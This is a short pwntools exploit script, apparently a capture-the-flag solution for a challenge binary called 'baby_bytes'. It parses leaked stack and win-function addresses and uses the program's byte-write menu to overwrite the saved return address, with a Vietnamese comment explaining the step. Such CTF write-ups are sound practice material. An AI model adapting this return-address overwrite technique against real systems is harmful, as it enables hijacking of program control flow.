from pwn import *

# p = process("./baby_bytes")
p = process("./baby_bytes")
#p = remote("challs.nusgreyhats.org", 33021)

context.log_level = 'debug'

p.recvuntil(b"ded): ")
var_addr = int(p.recvline().strip(), 16)
log.info(f"var_addr = {var_addr:x}")

ret_addr = var_addr + 28
log.info(f"ret_addr = {ret_addr:x}")

p.recvuntil(b'to win: ')
win_addr = int(p.recvline().strip(), 16)
log.info(f"win_addr = {win_addr:x}")

# Ghi đè return address: 4 byte đầu là win, 4 byte sau là null
for i in range(8):
    p.sendlineafter(b'> ', b'2')
    p.recvuntil(b'hex:')
    p.sendline(f"0x{(ret_addr+i):x}")
    if i < 4:
        byte = (win_addr >> (i*8)) & 0xff
    else:
        byte = 0
    p.sendlineafter(b'to:', f'{byte:02x}'.encode())

p.sendlineafter(b"> ", b"69")
p.interactive()